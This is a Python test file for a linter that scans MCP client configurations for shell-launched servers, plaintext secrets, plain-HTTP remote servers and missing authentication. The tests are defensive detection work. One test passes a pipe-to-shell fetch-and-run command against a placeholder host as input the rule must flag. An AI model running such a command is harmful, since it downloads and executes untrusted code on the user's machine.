"""Tests for the config hygiene rule.

Heavy on negative cases. This rule reads the config of somebody who has already
made their choices, and a checker that objects to a normal `npx` line is one
they will run once.
"""

from pathlib import Path

from mcplint.config_scan import ConfiguredServer
from mcplint.core import HIGH, LOW, MEDIUM
from mcplint.rules.config_hygiene import (
    INSECURE_TRANSPORT_RULE_ID,
    NO_AUTH_RULE_ID,
    PLAINTEXT_SECRET_RULE_ID,
    SHELL_LAUNCH_RULE_ID,
    check_config_hygiene,
)

SOURCE = Path("/home/me/.config/Claude/claude_desktop_config.json")


def _server(**overrides):
    return ConfiguredServer(
        name=overrides.pop("name", "server"),
        client=overrides.pop("client", "Claude Desktop"),
        source=SOURCE,
        **overrides,
    )


def _ids(findings):
    return [finding.rule_id for finding in findings]


# --- launch commands --------------------------------------------------------


def test_a_shell_launch_is_high_severity():
    server = _server(command="bash", args=["-c", "node ./server.js"])

    findings = check_config_hygiene([server])

    assert _ids(findings) == [SHELL_LAUNCH_RULE_ID]
    assert findings[0].severity == HIGH


def test_every_common_shell_is_recognised():
    for program, flag in (
        ("bash", "-c"),
        ("sh", "-c"),
        ("zsh", "-c"),
        ("cmd", "/c"),
        ("cmd.exe", "/C"),
        ("powershell", "-Command"),
        ("pwsh", "-c"),
    ):
        findings = check_config_hygiene([_server(command=program, args=[flag, "x"])])

        assert _ids(findings) == [SHELL_LAUNCH_RULE_ID], f"{program} {flag}"


def test_an_absolute_path_to_a_shell_still_counts():
    server = _server(command="/usr/bin/bash", args=["-c", "x"])

    assert _ids(check_config_hygiene([server])) == [SHELL_LAUNCH_RULE_ID]


def test_fetching_and_running_code_is_caught_whatever_launches_it():
    server = _server(command="node", args=["-e", "curl https://x.example | sh"])

    findings = check_config_hygiene([server])

    assert _ids(findings) == [SHELL_LAUNCH_RULE_ID]
    assert "fetches or evaluates" in findings[0].message


def test_an_ordinary_npx_launch_is_not_a_finding():
    # The line in every MCP server's own README. A rule that flags this is a
    # rule nobody keeps switched on.
    server = _server(command="npx", args=["-y", "@modelcontextprotocol/server-filesystem", "/srv"])

    assert check_config_hygiene([server]) == []


def test_a_shell_named_without_a_script_flag_is_not_a_finding():
    # Someone whose server genuinely is called `sh` in a directory somewhere,
    # invoked with real arguments rather than a script.
    server = _server(command="sh", args=["--serve", "--port", "9000"])

    assert check_config_hygiene([server]) == []


def test_a_plain_binary_is_not_a_finding():
    assert check_config_hygiene([_server(command="mcp-postgres", args=["--readonly"])]) == []


# --- secrets ----------------------------------------------------------------


def test_a_literal_token_in_env_is_flagged_and_redacted():
    server = _server(command="run", env={"API_TOKEN": "sk-live-4f9a2b7c1d8e"})

    findings = check_config_hygiene([server])

    assert _ids(findings) == [PLAINTEXT_SECRET_RULE_ID]
    assert findings[0].severity == MEDIUM
    assert "sk-live-4f9a2b7c1d8e" not in findings[0].evidence_snippet
    assert "sk-l" in findings[0].evidence_snippet


def test_a_reference_to_a_secret_is_not_a_secret():
    # The fix this rule recommends must not itself trip the rule.
    for value in ("${VAULT_TOKEN}", "$VAULT_TOKEN", "%VAULT_TOKEN%"):
        server = _server(command="run", env={"API_TOKEN": value})

        assert check_config_hygiene([server]) == [], value


def test_an_ordinary_setting_is_not_a_secret():
    server = _server(command="run", env={"PORT": "5432", "LOG_LEVEL": "debug"})

    assert check_config_hygiene([server]) == []


def test_a_short_value_under_a_secret_name_is_not_a_secret():
    server = _server(command="run", env={"API_KEY": "off"})

    assert check_config_hygiene([server]) == []


def test_an_authorization_header_written_into_the_config_is_flagged():
    server = _server(url="https://x.example/mcp", headers={"Authorization": "Bearer abcdef123456"})

    assert PLAINTEXT_SECRET_RULE_ID in _ids(check_config_hygiene([server]))


# --- transport --------------------------------------------------------------


def test_plain_http_to_a_remote_host_is_high_severity():
    server = _server(url="http://metrics.example.com/mcp")

    findings = check_config_hygiene([server])

    assert INSECURE_TRANSPORT_RULE_ID in _ids(findings)
    assert next(f for f in findings if f.rule_id == INSECURE_TRANSPORT_RULE_ID).severity == HIGH


def test_plain_http_to_this_machine_is_not_a_finding():
    for host in ("localhost", "127.0.0.1", "[::1]"):
        findings = check_config_hygiene([_server(url=f"http://{host}:8000/mcp")])

        assert INSECURE_TRANSPORT_RULE_ID not in _ids(findings), host


def test_a_remote_server_with_no_credential_is_low_severity():
    findings = check_config_hygiene([_server(url="https://x.example/mcp")])

    assert _ids(findings) == [NO_AUTH_RULE_ID]
    assert findings[0].severity == LOW


def test_a_credential_in_the_environment_counts_as_authenticated():
    server = _server(url="https://x.example/mcp", env={"MCP_TOKEN": "${VAULT_TOKEN}"})

    assert NO_AUTH_RULE_ID not in _ids(check_config_hygiene([server]))


def test_a_local_server_is_not_asked_about_authentication():
    # A command on this machine is not reached over anything, so there is
    # nothing for a credential to protect.
    assert check_config_hygiene([_server(command="mcp-postgres")]) == []


# --- the finding itself -----------------------------------------------------


def test_findings_name_the_server_and_the_client():
    findings = check_config_hygiene([_server(name="files", command="bash", args=["-c", "x"])])

    assert findings[0].tool_name == "files"
    assert "Claude Desktop" in findings[0].message


def test_findings_say_which_file_to_open():
    findings = check_config_hygiene([_server(command="bash", args=["-c", "x"])])

    assert str(SOURCE) in findings[0].evidence_snippet


def test_findings_are_labelled_as_being_about_servers():
    # So the report says "server: files" rather than "tool: files", which would
    # be a small lie in the output of a tool whose argument is that you should
    # be able to check its output.
    findings = check_config_hygiene([_server(command="bash", args=["-c", "x"])])

    assert findings[0].subject_kind == "server"


def test_every_finding_carries_a_remedy():
    servers = [
        _server(name="a", command="bash", args=["-c", "x"]),
        _server(name="b", command="run", env={"API_TOKEN": "sk-live-4f9a2b7c1d8e"}),
        _server(name="c", url="http://x.example/mcp"),
    ]

    for finding in check_config_hygiene(servers):
        assert finding.remediation, finding.rule_id


def test_an_empty_config_produces_nothing():
    assert check_config_hygiene([]) == []


# --- the fixture ------------------------------------------------------------


def test_the_poisoned_config_fixture_trips_every_check():
    from mcplint.config_scan import discover_servers

    fixture = Path(__file__).parent / "fixtures" / "poisoned_config.json"
    servers, read = discover_servers([("Claude Desktop", fixture)])

    findings = check_config_hygiene(servers)

    assert read == [fixture]
    assert set(_ids(findings)) == {
        SHELL_LAUNCH_RULE_ID,
        PLAINTEXT_SECRET_RULE_ID,
        INSECURE_TRANSPORT_RULE_ID,
        NO_AUTH_RULE_ID,
    }


def test_the_ordinary_server_in_that_fixture_is_left_alone():
    from mcplint.config_scan import discover_servers

    fixture = Path(__file__).parent / "fixtures" / "poisoned_config.json"
    servers, _ = discover_servers([("Claude Desktop", fixture)])

    flagged = {finding.tool_name for finding in check_config_hygiene(servers)}

    assert "files" not in flagged, "a plain npx launch must not be a finding"


def test_a_vault_reference_in_that_fixture_is_not_reported_as_a_secret():
    from mcplint.config_scan import discover_servers

    fixture = Path(__file__).parent / "fixtures" / "poisoned_config.json"
    servers, _ = discover_servers([("Claude Desktop", fixture)])
    postgres = next(server for server in servers if server.name == "postgres")

    secrets = [
        finding
        for finding in check_config_hygiene([postgres])
        if finding.rule_id == PLAINTEXT_SECRET_RULE_ID
    ]

    assert [f.message.split('"')[1] for f in secrets] == ["DATABASE_PASSWORD"]
